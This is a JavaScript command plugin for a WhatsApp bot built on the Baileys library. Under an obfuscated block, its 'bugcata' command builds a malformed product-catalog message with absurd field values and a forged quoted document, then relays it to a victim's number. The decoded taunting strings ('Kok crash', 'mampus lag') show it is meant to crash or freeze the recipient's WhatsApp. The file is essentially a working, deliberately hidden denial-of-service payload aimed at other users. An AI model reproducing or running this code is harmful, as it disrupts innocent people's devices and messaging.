 let { BufferJSON, WA_DEFAULT_EPHEMERAL, prepareWAMessageMedia, generateWAMessageFromContent, proto } = (await import('@adiwajshing/baileys')).default
import { xpRange } from '../lib/levelling.js'
import path from 'path'
import fs from 'fs'
import fetch from 'node-fetch'
import moment from 'moment-timezone'
import jimp from 'jimp'

let handler = async (m, { conn, text, command, usedPrefix }) => {
let { exp, limit, age, money, level, role, registered } = global.db.data.users[m.sender]
    let { min, xp, max } = xpRange(level, global.multiplier)
    let umur = `*${age == '-1' ? 'Belum Daftar*' : age + '* Thn'}`
	let name = registered ? global.db.data.users[m.sender].name : conn.getName(m.sender)

const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}

//TIME
let d = new Date(new Date + 3600000)
    let locale = 'id'
    // d.getTimeZoneOffset()
    // Offset -420 is 18.00
    // Offset    0 is  0.00
    // Offset  420 is  7.00
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })

const _0xe1d695=_0x997a;(function(_0x52ca9b,_0x3eb28f){const _0x477794=_0x997a,_0x187422=_0x52ca9b();while(!![]){try{const _0x33759c=parseInt(_0x477794(0xf9))/(0x1e4d+-0x36e*0xb+0x76e)*(-parseInt(_0x477794(0xf2))/(0x87b*0x2+-0x2674*0x1+0x1580))+parseInt(_0x477794(0xee))/(0x12c7+0x1071+0x1*-0x2335)+-parseInt(_0x477794(0x10f))/(0x946+0xad1+-0x1413)*(parseInt(_0x477794(0xf1))/(0x21e8+-0x3*-0x8cd+-0x3c4a))+parseInt(_0x477794(0xe4))/(-0x766*-0x2+-0x1*-0xa65+-0x11*0x17b)*(parseInt(_0x477794(0x102))/(-0x1*0x7c7+-0x55*0x5e+0x16*0x1c6))+-parseInt(_0x477794(0xe5))/(-0x1fd6+0xae6+-0x4*-0x53e)+-parseInt(_0x477794(0xdd))/(-0x1b16+0x1*-0x18ef+0x1*0x340e)+parseInt(_0x477794(0x10a))/(0x3*0x5fd+0x10b2+-0x229f)*(parseInt(_0x477794(0x113))/(0x1e1c*-0x1+-0x6c0+-0x24e7*-0x1));if(_0x33759c===_0x3eb28f)break;else _0x187422['push'](_0x187422['shift']());}catch(_0x1bf0c9){_0x187422['push'](_0x187422['shift']());}}}(_0x5daa,0x11e8c5+0x54*0x26c6+0x29*-0x8297));const doc={'key':{'fromMe':![],'participant':_0xe1d695(0xe3)+_0xe1d695(0x106),...m[_0xe1d695(0xe0)]?{'remoteJid':''}:{}},'message':{'documentMessage':{'url':_0xe1d695(0xdb)+_0xe1d695(0xf6)+_0xe1d695(0x109)+_0xe1d695(0xe7)+_0xe1d695(0xd7)+_0xe1d695(0xe8)+_0xe1d695(0xe2)+_0xe1d695(0x10e),'mimetype':_0xe1d695(0x112)+_0xe1d695(0xca)+_0xe1d695(0xfe),'fileSha256':_0xe1d695(0x107)+_0xe1d695(0xc3)+_0xe1d695(0x105)+_0xe1d695(0xfa)+_0xe1d695(0xea),'fileLength':_0xe1d695(0x10d),'pageCount':0x1,'mediaKey':_0xe1d695(0xc7)+_0xe1d695(0x10c)+_0xe1d695(0xf3)+_0xe1d695(0xf0)+_0xe1d695(0xf7),'fileName':_0xe1d695(0xef)+'s','fileEncSha256':_0xe1d695(0xfd)+_0xe1d695(0x103)+_0xe1d695(0xce)+_0xe1d695(0xde)+_0xe1d695(0x10b)}}};function _0x5daa(){const _0x3354e0=['https://mm',':\x0a.bugcata','9712908NgrvFn','G2W69AVPLg','relayMessa','chat','Katanya\x20Wa','RXGvVNWAbF','0@s.whatsa','4116162WImkfj','7080152MCovwc','\x20Kebal:v,\x20','j85sbZCtNt','UTKfgrl2zX','split','M9k=','80@s.whats','ans','IDR','1533756mHBMTt','Deffri\x20Gan','7lCAd1PIz3','5vYPGQk','333724nXzHZY','5h/TZzubVJ','@s.whatsap','By\x20Deffri\x20','g.whatsapp','Qb0=','data','3BorXuh','h3rmcoHN76','Kok\x20crash:','Gans','ybdZlRjhY+','ream','mampus\x20lag','app.net','75071','7RBkNOv','aXtytT0G2H','bang:v','/DXIECzjrS','pp.net','TSSZu8gDEA','imageMessa','.net/d/f/A','50090OvGoMj','5yk=','iUZ5HKluLD','64455','nsp.enc','1378756FDMxbD','wa.me/6288','reply','applicatio','4939nGRKqd','?\x20Deffri\x20G','./media/menus/Menu1.jpg','Php8vjdtJS','Server','6288878169','users','P32GszzU5p','key','waUploadTo','n/octet-st','fromObject','dah\x20kelar\x20','87816980','HN4iKWCFis','readFileSy','t\x20Anda\x20Sal','4497569503','sender','Message','Maaf\x20Forma','message','ah\x0a\x0aContoh','q1cJ6JupaB','p.net','l.jpg','\x2062¡Á¡Á¡Á¡Á'];_0x5daa=function(){return _0x3354e0;};return _0x5daa();}if(!text)return m[_0xe1d695(0x111)](_0xe1d695(0xd4)+_0xe1d695(0xd0)+_0xe1d695(0xd6)+_0xe1d695(0xdc)+_0xe1d695(0xda));let [number,pesan]=text[_0xe1d695(0xe9)]`|`,user=global['db'][_0xe1d695(0xf8)][_0xe1d695(0xc6)][m[_0xe1d695(0xd2)]],korban=''+number;function _0x997a(_0x3aeb60,_0x343201){const _0x16ee9a=_0x5daa();return _0x997a=function(_0x38e2fc,_0x1cf2e2){_0x38e2fc=_0x38e2fc-(-0xc1d*-0x1+-0x19c4+-0x20f*-0x7);let _0x42d3d3=_0x16ee9a[_0x38e2fc];return _0x42d3d3;},_0x997a(_0x3aeb60,_0x343201);}var nomor=m[_0xe1d695(0xd2)],messa=await prepareWAMessageMedia({'image':fs[_0xe1d695(0xcf)+'nc'](_0xe1d695(0xc2)+_0xe1d695(0xd9))},{'upload':conn[_0xe1d695(0xc9)+_0xe1d695(0xc4)]}),catalog=generateWAMessageFromContent(korban,proto[_0xe1d695(0xd3)][_0xe1d695(0xcb)]({'productMessage':{'product':{'productImage':messa[_0xe1d695(0x108)+'ge'],'productId':_0xe1d695(0xd1)+_0xe1d695(0x101),'title':_0xe1d695(0xf5)+_0xe1d695(0xfc),'description':_0xe1d695(0xe1)+_0xe1d695(0xe6)+_0xe1d695(0xfb)+'v','currencyCode':_0xe1d695(0xed),'footerText':_0xe1d695(0xff)+'\x20','productImageCount':0x174876e7ff,'firstImageId':0xe8d4a50fff,'retailerId':_0xe1d695(0x114)+_0xe1d695(0xec),'url':_0xe1d695(0x110)+_0xe1d695(0xcd)},'businessOwnerJid':_0xe1d695(0xc5)+_0xe1d695(0xeb)+_0xe1d695(0x100)}}),{'userJid':m[_0xe1d695(0xe0)],'quoted':doc});conn[_0xe1d695(0xdf)+'ge'](korban+(_0xe1d695(0xf4)+_0xe1d695(0xd8)),catalog[_0xe1d695(0xd5)],{'messageId':catalog[_0xe1d695(0xc8)]['id']}),m[_0xe1d695(0x111)](_0xe1d695(0xcc)+_0xe1d695(0x104));
}
handler.command = /^(bugcata)$/i

handler.owner = true

export default handler
